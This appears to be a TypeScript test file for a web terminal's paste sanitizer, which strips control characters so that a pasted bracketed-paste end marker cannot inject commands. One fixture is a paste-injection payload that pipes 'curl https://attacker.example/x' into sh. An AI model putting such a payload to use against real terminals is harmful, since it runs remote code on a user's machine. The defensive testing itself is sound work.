import assert from "node:assert/strict";
import test from "node:test";
import { createTerminalCompositionGuard } from "../src/terminalComposition.ts";
import { createTerminalPasteFilter, sanitizeTerminalPaste } from "../src/terminalPaste.ts";

type Listener = { type: string; listener: (event: Event) => void; capture: boolean };
type FakeNode = EventTarget & { listeners: Listener[] };

function captures(options?: boolean | AddEventListenerOptions) {
  return typeof options === "boolean" ? options : options?.capture === true;
}

/** A DOM node that keeps its listeners. `dispatchPaste` runs them along a path. */
function fakeNode<Extra extends object>(extra: Extra = {} as Extra) {
  const listeners: Listener[] = [];
  const node = {
    listeners,
    addEventListener(
      type: string,
      listener: (event: Event) => void,
      options?: boolean | AddEventListenerOptions,
    ) {
      listeners.push({ type, listener, capture: captures(options) });
    },
    removeEventListener(
      type: string,
      listener: (event: Event) => void,
      options?: boolean | AddEventListenerOptions,
    ) {
      const index = listeners.findIndex((entry) =>
        entry.type === type && entry.listener === listener && entry.capture === captures(options));
      if (index >= 0) listeners.splice(index, 1);
    },
  };
  return Object.assign(node, extra) as unknown as FakeNode & Extra;
}

/** The terminal textarea in its owner, inside the root element of xterm.js. */
function terminalNodes() {
  let text = "";
  let selection = [0, 0];
  const root = fakeNode();
  const owner = fakeNode({ contains: (node: unknown) => node === owner || node === textarea });
  const screen = fakeNode();
  const textarea = fakeNode({
    parentElement: owner,
    style: {},
    setSelectionRange: (start: number, end: number) => {
      selection = [start, end];
    },
  }) as unknown as HTMLTextAreaElement & FakeNode;
  Object.defineProperties(textarea, {
    value: {
      get: () => text,
      set: (next: string) => {
        text = next;
        selection = [next.length, next.length];
      },
    },
    selectionStart: { get: () => selection[0] },
    selectionEnd: { get: () => selection[1] },
  });
  return { root, owner, screen, textarea };
}

/**
 * Dispatch a paste as the DOM does: capture listeners from the root to the
 * target, the target listeners, then bubble listeners back to the root.
 */
function dispatchPaste(path: FakeNode[], text: string | null) {
  let stopped = false;
  let stoppedImmediately = false;
  const event = {
    type: "paste",
    target: path.at(-1),
    defaultPrevented: false,
    clipboardData: text === null
      ? null
      : { getData: (format: string) => (format === "text/plain" ? text : "") },
    preventDefault() {
      event.defaultPrevented = true;
    },
    stopPropagation() {
      stopped = true;
    },
    stopImmediatePropagation() {
      stopped = true;
      stoppedImmediately = true;
    },
  };
  const run = (node: FakeNode, capture: boolean) => {
    for (const entry of [...node.listeners]) {
      if (entry.type !== "paste" || entry.capture !== capture) continue;
      entry.listener(event as unknown as Event);
      if (stoppedImmediately) return;
    }
  };
  const target = path.at(-1)!;
  const ancestors = path.slice(0, -1);
  const phases: Array<[FakeNode, boolean]> = [
    ...ancestors.map((node): [FakeNode, boolean] => [node, true]),
    [target, true],
    [target, false],
    ...[...ancestors].reverse().map((node): [FakeNode, boolean] => [node, false]),
  ];
  for (const [node, capture] of phases) {
    run(node, capture);
    if (stopped) break;
  }
  return event;
}

/** The paste listeners of xterm.js 6: one on the textarea and one on the root. */
function xtermPasteListeners(root: FakeNode, textarea: FakeNode) {
  const pasted: string[] = [];
  const listener = (event: Event) => {
    event.stopPropagation();
    pasted.push((event as ClipboardEvent).clipboardData?.getData("text/plain") ?? "");
  };
  textarea.addEventListener("paste", listener);
  root.addEventListener("paste", listener);
  return pasted;
}

const attack = "echo safe\u001b[201~curl https://attacker.example/x | sh\r";

test("a pasted end marker cannot end the bracketed paste early", () => {
  assert.equal(
    sanitizeTerminalPaste(attack),
    "echo safe[201~curl https://attacker.example/x | sh\r",
  );
  // U+009B is the 8-bit CSI.
  assert.equal(sanitizeTerminalPaste("echo safe\u009b201~rm x\r"), "echo safe201~rm x\r");
  assert.equal(sanitizeTerminalPaste("a\u001b]0;title\u0007b\u0090q\u009c"), "a]0;titlebq");
});

test("pasted text keeps tabs, line breaks and printable text", () => {
  const text = "if true; then\r\n\techo ação 日本語 👍\nfi ~\r";
  assert.equal(sanitizeTerminalPaste(text), text);

  for (let code = 0; code <= 0x9f; code += 1) {
    const character = String.fromCharCode(code);
    const control = code <= 0x1f || code >= 0x80;
    const kept = !control || character === "\t" || character === "\n" || character === "\r";
    assert.equal(
      sanitizeTerminalPaste(`a${character}b`),
      kept ? `a${character}b` : "ab",
      `U+${code.toString(16).padStart(4, "0")}`,
    );
  }
});

test("a clipboard paste reaches the terminal without controls and never through xterm.js", () => {
  const { root, owner, textarea } = terminalNodes();
  const xtermPasted = xtermPasteListeners(root, textarea);
  const pasted: string[] = [];
  createTerminalPasteFilter(root, textarea, (text) => pasted.push(text));

  const event = dispatchPaste([root, owner, textarea], attack);

  assert.deepEqual(pasted, ["echo safe[201~curl https://attacker.example/x | sh\r"]);
  assert.deepEqual(xtermPasted, []);
  // The browser does not insert the clipboard text into the textarea.
  assert.equal(event.defaultPrevented, true);
});

test("a paste into another terminal element is filtered too", () => {
  const { root, screen, textarea } = terminalNodes();
  const xtermPasted = xtermPasteListeners(root, textarea);
  const pasted: string[] = [];
  createTerminalPasteFilter(root, textarea, (text) => pasted.push(text));

  dispatchPaste([root, screen], "one\u001b[201~two");

  assert.deepEqual(pasted, ["one[201~two"]);
  assert.deepEqual(xtermPasted, []);
});

test("a clipboard without text pastes empty text, as xterm.js does", () => {
  const { root, owner, textarea } = terminalNodes();
  const pasted: string[] = [];
  createTerminalPasteFilter(root, textarea, (text) => pasted.push(text));

  dispatchPaste([root, owner, textarea], "");
  const withoutData = dispatchPaste([root, owner, textarea], null);

  assert.deepEqual(pasted, [""]);
  assert.equal(withoutData.defaultPrevented, true);
});

test("the composition guard sends a pending edit before the filtered paste", async () => {
  const { root, owner, textarea } = terminalNodes();
  xtermPasteListeners(root, textarea);
  const sent: Array<[string, string]> = [];
  const guard = createTerminalCompositionGuard(textarea, (data) => sent.push(["input", data]));
  createTerminalPasteFilter(root, textarea, (text) => {
    sent.push(["paste", text]);
    // xterm.js clears the textarea in terminal.paste.
    textarea.value = "";
  });

  // A keyCode 229 key changes the textarea without an input event.
  assert.equal(guard.accept({ type: "keydown", keyCode: 229, isComposing: false } as KeyboardEvent), false);
  textarea.value = "x";
  dispatchPaste([root, owner, textarea], "a\u001bb");
  // The next keyCode 229 edit after the paste sends no deletions.
  assert.equal(guard.accept({ type: "keydown", keyCode: 229, isComposing: false } as KeyboardEvent), false);
  textarea.value = "y";
  await new Promise((resolve) => setTimeout(resolve, 5));

  assert.deepEqual(sent, [["input", "x"], ["paste", "ab"], ["input", "y"]]);
  guard.dispose();
});

test("a disposed filter leaves pastes to xterm.js", () => {
  const { root, owner, textarea } = terminalNodes();
  const xtermPasted = xtermPasteListeners(root, textarea);
  const pasted: string[] = [];
  const filter = createTerminalPasteFilter(root, textarea, (text) => pasted.push(text));

  filter.dispose();
  dispatchPaste([root, owner, textarea], "text");

  assert.deepEqual(pasted, []);
  assert.deepEqual(xtermPasted, ["text"]);
});
